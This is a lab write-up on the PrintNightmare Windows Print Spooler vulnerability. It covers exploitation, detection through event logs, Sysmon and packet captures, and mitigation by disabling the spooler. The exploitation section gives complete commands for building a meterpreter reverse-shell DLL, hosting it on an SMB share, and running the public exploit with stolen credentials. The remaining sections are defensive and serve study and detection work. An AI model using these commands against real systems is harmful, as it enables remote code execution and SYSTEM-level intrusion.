## Introduction

This box covers the vulnerability known as PrintNightmare [`(CVE-2021-1675)`](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) 
and [`(CVE-2021-34527)`](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527). The attack is a 
post compromise attack. Which means that we must have compromised a user account and gotten their credentials, in order
for the attack to be successful.

PrintNightmare vulnerability is "a remote code execution vulnerability that occurs when the Windows `Print Spooler` 
service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability
could run arbitrary code with SYSTEM privileges and could then install programs; view, change, or delete data; 
or create new accounts with full user rights."

So we will be looking into the `Printnightmare` vulnerability from an offensive and defensive perspective. 
Keep in mind that to exploit the `CVE-2021-1675` vulnerability, the attacker would need to have direct or local 
access to the machine to use a malicious DLL file to escalate privileges. On the other hand, to exploit the 
`CVE-2021-34527` vulnerability successfully, the attacker can remotely inject the malicious DLL file.

### What is Print Spooler Service?

![spooler](https://i.ibb.co/GM5RPFc/printspool.png)

According to [Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc),
the Print spooler service manages the printing processes and is responsible for managing the print jobs, receiving 
files to be printed, queueing them, and scheduling.

![sevices](/assets/img/services.png)

By default, the Print spooler service is enabled on all Windows clients and servers, and it is used by Domain controllers
for `printer pruning` (the process of removing the printers that are not in use anymore on the network and have been added as objects to Active Directory).

## Exploitation

We need the [exploit](https://github.com/tryhackme/CVE-2021-1675) and [impacket](https://github.com/tryhackme/impacket)
to carry out this attack on our target machine.

Before we proceed, we need to create `2` directories on our attacker machine:

- `pn`: we will store the exploit and impacket in here.
- `share`: it will contain the malicious DLL that will be created with msfvenom.

### Steps

- The first step is to create the malicious DLL with `msfvenom`:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your-IP-address> LPORT=<port> -f dll -o ~/Desktop/share/malicious.dl
```
![msfvenom](/assets/img/msfvenom.png)

- Then we need to fire up metasploit to configure the handler to receive the incoming connection from the malicious DLL. 
  
![msfconsole](/assets/img/msfconsole.png)

Run the following commands options:
 
 - `use exploit/multi/handler`
 - `set payload windows/x64/meterpreter/reverse_tcp`
 - `set lhost {your-ip-address}`
 - `set lport {port}`

**Note**: The value for **LHOST** and **LPORT** must be the same values you used to create the malicious DLL.

![configure](/assets/img/configure.png)

- Then we run it to actively wait for a connection. use `run -j` to initiate it. The `-j` simply means to run it as a job.

![jobs](/assets/img/jobs.png)

- The next step is to host the malicious DLL in a SMB share running on our attacker machine. 
We will use `smbserver.py` from impacket to do so.

```bash
smbserver.py share /<your-machine-username>/Desktop/share/ -smb2support
```

![smbserver](/assets/img/smbserver.png)

- Now we will check if our target is vulnerable to the exploit.

```bash
rpcdump.py @<target-ip> | egrep 'MS-RPRN|MS-PAR'
```

![check](/assets/img/check.png)

- Now that we have confirmed that our target is vulnerable to the exploit, we will use the python script inside the 
`CVE-2021-1675` exploit we downloaded earlier,  to exploit the PrintNightmare vulnerability against our target.

```bash
python CVE-2021-1675.py <domain-controller-name>.<domain-name>/<username>:<password>@<target-ip> '\\<your-ip>\share\malicious.dll'
```

![cve](/assets/img/cve.png)

**Note**: The username and password is the low level Windows user account compromised. You can find the `domain controller` and 
`domain name` by running `nmap`. Also, don't worry about the Python errors after `Try 3`.

- We should see the SMB connection calling for the malicious DLL file on our attacker machine as well as a successful
Meterpreter session. 

![shell](/assets/img/shell.png)

**Note**: Use `sessions -i <id>` to pop the shell on meterpreter. You can get the `id` by running `jobs`.

## Indicators of Compromise

An attacker would most likely use `rpcdump.py` to scan for vulnerable hosts. After finding the vulnerable print server,
the attacker can then execute the exploit code (similar to the Python script in the previous task), which will
load the malicious DLL file to exploit the vulnerability. More specifically, the exploit code will call the
`pcAddPrinterDriverEx()` function from the authenticated user account and load the malicious DLL file in order to
exploit the vulnerability. The `pcAddPrinterDriverEx()` function is used to install a printer driver on the system.

[Sygnia](https://blog.sygnia.co/demystifying-the-print-nightmare-vulnerability) shared some advanced threat hunting 
tips to detect PrintNightmare. 

When hunting for PrintNightmare, you should look for the following:

- Search for the `spoolsv.exe` process launching `rundll32.exe` as a **child** process without any command-line arguments
- Considering the usage of the `pcAddPrinterDriverEx()` function, you will mostly find the malicious DLL dropped into one 
of these folders `%WINDIR%\system32\spool\drivers\x64\3\` folder along with DLLs that were loaded afterward from
`%WINDIR%\system32\spool\drivers\x64\3\Old\` (You should proactively monitor the folders for any unusual DLLs)
- Hunt for suspicious spoolsv.exe child processes (cmd.exe, powershell.exe, etc.)
- The attacker might even use `Mimikatz` to perform the attack, in this case, a print driver named ‘QMS 810’ will be
created. This can be detected by logging the registry changes (e.g., Sysmon ID 13).
- Search for DLLs that are part of the proof-of-concept codes that were made public, 
such as `MyExploit.dll`, `evil.dll`, `addCube.dll`, rev.dll, rev2.dll, main64.dll, mimilib.dll. If they're present on 
the endpoint, you can find them with Event ID 808 in Microsoft-Windows-PrintService.

**Note**: You can read up on [Splunk](https://www.splunk.com/en_us/blog/security/i-pity-the-spool-detecting-printnightmare-cve-2021-34527.html)'s 
blog on some detection search queries to identify `Printnightmare` on your system.

**Remember**:

- An attacker will most likely drop the DLL payload in the `C:\Windows\System32\spool\drivers\x64\3\` folder.
- `pcAddPrinterDriverEx()` is the function used to install printer drivers.
- `rpcdump.py` can be used to scan for vulnerable print servers.

## Detection: Windows Event Logs

Windows Event Logs serve as comprehensive documentation of **security**, **system**, and **application** notifications 
generated by the Windows operating system. While certain logs capture events associated with Print Spooler 
activity, these logs may not be activated by default and require configuration through `Windows Group Policy`
or `Powershell`.

The logs related to Print Spooler Activity are:

- **Microsoft-Windows-PrintService/Admin**
- **Microsoft-Windows-PrintService/Operational**

We can detect the PrintNightmare artifacts by looking at the endpoint events or Windows Event Logs mentioned above.

You can look for the following Event IDs:

- **Microsoft-Windows-PrintService/Operational** (Event ID **316**) - look for "Printer driver [file] for Windows x64 
Version-3 was added or updated. Files:- **UNIDRV.DLL**, **AddUser.dll**, **AddUser.dll**. No user action is required.”
- **Microsoft-Windows-PrintService/Admin** (Event ID **808**) - A security event source has attempted to register 
(can detect unsigned drivers and malicious DLLs loaded by spoolsv.exe)
- **Microsoft-Windows-PrintService/Operational** (Event ID **811**) - Logs the information regarding failed operations.
The event will provide information about the full path of the dropped DLL.
- **Microsoft-Windows-SMBClient/Security** (Event ID **31017**) - This Event ID can also be used to detect unsigned
drivers loaded by **spoolsv.exe**.
- **Windows System** (Event ID **7031**) - Service Stop Operations (This event ID will show you unexpected termination of
print spooler service).

You can also use **Sysmon** to detect PrintNightmare terror: 

- **Microsoft-Windows-Sysmon/Operational** (Event ID **3**) - Network connection (Look for suspicious ports)
- **Microsoft-Windows-Sysmon/Operational** (Event ID **11**) - FileCreate (File creation events are being logged,  
you can look for loaded DLLs in the Print Spooler’s driver directory: `C:\Windows\System32\spool\drivers\x64\3)`
- **Microsoft-Windows-Sysmon/Operational** (Event IDs **23**, **26**) - FileDelete (You can hunt for deleted 
malicious DLLs)

### Proof of Concept (PoC)

- To see the dropped `DLL`. Open **Event viewer** > **Applications and Services Logs** > **Microsoft** > **Windows** > 
**PrintService** > **Admin**

![Event](/assets/img/Event.png)

![dll](/assets/img/dll.png)

- To find the `event log name` and the `event ID` that detected the dropped DLL. Open **Event viewer** > **Applications and Services Logs** > **Microsoft** > **Windows** > 
**PrintService** > **Admin**

![event2](/assets/img/event2.png)

- To find the `source name` and the `event ID` when the Print Spooler Service stopped unexpectedly. Open **Event viewer** > **Applications and Services Logs** > **Microsoft** > **Windows** > 
**PrintService** > **Admin** > **Create Custom View** > Tick **Windows Logs** > In **Includes/Excludes** field, add **7031** > press **Enter** > save it and press **OK**

![service](/assets/img/service.png)

![service2](/assets/img/service2.png)

**Note**: Remember Event ID **7031** shows unexpected termination of print spooler service, hence why we added it to the **Includes/Excludes** field to narrow down our search.

- To find the attacker's shell connection, ip address, and the destination hostname. Open **Event viewer** > **Applications and Services Logs** > **Microsoft** > **Windows** > 
**Sysmon** > **Operational** > **Create Custom View** > **Applications and Services Logs** > **Microsoft** > **Windows** > Tick **Sysmon** > In **Includes/Excludes** field, add **3** > Tick all **Event level** > press **Enter** > save it and press **OK**

![Event](/assets/img/Event.png)

![sysmon](/assets/img/sysmon.png)

![sysmon1](/assets/img/sysmon1.png)

![sysmon2](/assets/img/sysmon2.png)

![sysmon3](/assets/img/sysmon3.png)

**Note**: Remember Event ID **3** shows Network connection as well as suspicious ports, hence why we added it to the **Includes/Excludes** field to narrow down our search.
Port **4747** is the only suspicious port in this case as other destination ports in the log are for `ldap`, `ms-wbt-server`, and `http`.

- To find a Sysmon **FileCreated** event that was generated and logged, the full path to the dropped DLL and the earliest creation time in UTC.
Open **Event viewer** > **Applications and Services Logs** > **Microsoft** > **Windows** > 
**Sysmon** > **Operational** > **Create Custom View** > **Applications and Services Logs** > **Microsoft** > **Windows** > Tick **Sysmon** > In **Includes/Excludes** field, add **11** > press **Enter** > save it and press **OK**

![sysmon4](/assets/img/sysmon4.png)

![sysmon5](/assets/img/sysmon5.png)

**Note**: Remember Event ID **11** shows File creation events that are being logged, hence why we added it to the **Includes/Excludes** field to narrow down our search. Also, we know the file (dropped DLL) must have been generated at least sometime after
**8/13/21 at 10:33 AM** based on the previously established connection time with the attacker. See the `Date and Time` stamp in previous task.

## Detection: Packet Analysis

Packet captures (pcap) play a vital role in identifying indications of compromise.

Spotting the **PrintNightmare attack**, specifically related to **CVE-2021-1675** and **CVE-2021-34527**, through the analysis of network traffic is not as straightforward as examining artifacts like
Windows Event Logs on the affected machine. The attacker relies on the inclusion of a printer driver using `DCE/RPC` commands such as `RpcAddPrinterDriver` or `RpcAddPrinterDriverEx`.

**DCE/RPC**, or **Distributed Computing Environment/Remote Procedure Calls**, serves as the remote procedure call establishing APIs and an over-the-network protocol. However, the attack is more intricate
to detect because there are legitimate uses for `RpcAddPrinterDriver` or `RpcAddPrinterDriverEx` commands. Therefore, relying on network traffic analysis may not always provide confidence that the PrintNightmare attack occurred in your environment.

According to [Corelight](https://corelight.com/blog/why-is-printnightmare-hard-to-detect), detection becomes even more challenging when the exploit utilizes `SMB3` encryption to wrap the DCE/RPC calls.
Corelight also released a [Zeek package](https://github.com/corelight/CVE-2021-1675) that detects the printer driver additions over DCE/RPC commands that are not encrypted.

### Proof of Concept (PoC)

- To find the hostname of the **domain controller**, **local domain**, and **user account** utilized to exploit the vulnerability. Open the packet with **wireshark** > **Edit** > **Find Packet** > select **String** in the drop down box to the right > type **.local** in the text box > click **Find**

![wireshark](/assets/img/wireshark.png)

![wireshark1](/assets/img/wireshark1.png)

![wireshark2](/assets/img/wireshark2.png)

![wireshark3](/assets/img/wireshark3.png)

- To find the malicious DLL used in the exploit. Click on **Edit** > **Find Packet** > select **String** in the drop down box to the right > type **.dll** in the text box > click **Find**

![wireshark4](/assets/img/wireshark4.png)

- The attacker **ip address** is the **Destination**

![wireshark5](/assets/img/wireshark5.png)

- To see the **UNC** path where the malicious DLL was hosted, click on **File** > **Export Objects** > Choose **SMB/SMB2**. The UNC path can be found under **Hostname** column.

![wireshark6](/assets/img/wireshark6.png)

![wireshark7](/assets/img/wireshark7.png)

- The associated protocol with the encrypted packets is `SMB3`

![wireshark8](/assets/img/wireshark8.png)

## Mitigation: Disable Print Spooler

We can still mitigate or defend against the attack by disabling the Print Spooler on all domain controllers.

[Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) provided the steps to detect if Print
Spooler service is enabled and how to disable them:

- First, you need to determine if the Print Spooler service is running.

Run the following in Windows PowerShell (Run as administrator):

```powershell
Get-Service -Name Spooler
```
```powershell
Get-Service -Name Spooler
```

- If Print Spooler is running or if the service is not set to disabled, then select one of the options below to either **disable the Print Spooler service** 
or to **Disable inbound remote printing through Group Policy**.

`Option 1)  Disable the Print Spooler service`:

If disabling the Print Spooler service is appropriate for your environment, use the following PowerShell commands:

```powershell
Stop-Service -Name Spooler -Force
```

```powershell
Set-Service -Name Spooler -StartupType Disabled
```

**Note**: By disabling the Print Spooler service, you remove the ability to print **locally** and **remotely**.

`Option 2)  Disable inbound remote printing through Group Policy`:

The settings via Group Policy can be configured as follows:

**Computer Configuration / Administrative Templates / Printers**

Disable the “Allow Print Spooler to accept client connections” policy to block remote attacks.

This policy will block the remote attack vector by preventing inbound remote printing operations. The system will no 
longer operate as a print server, but local printing to a directly attached device will still work.

**Note**: Remember that for the group policy to take effect across the domain, or even the local machine, you need to issue a `gpupdate /force` command.
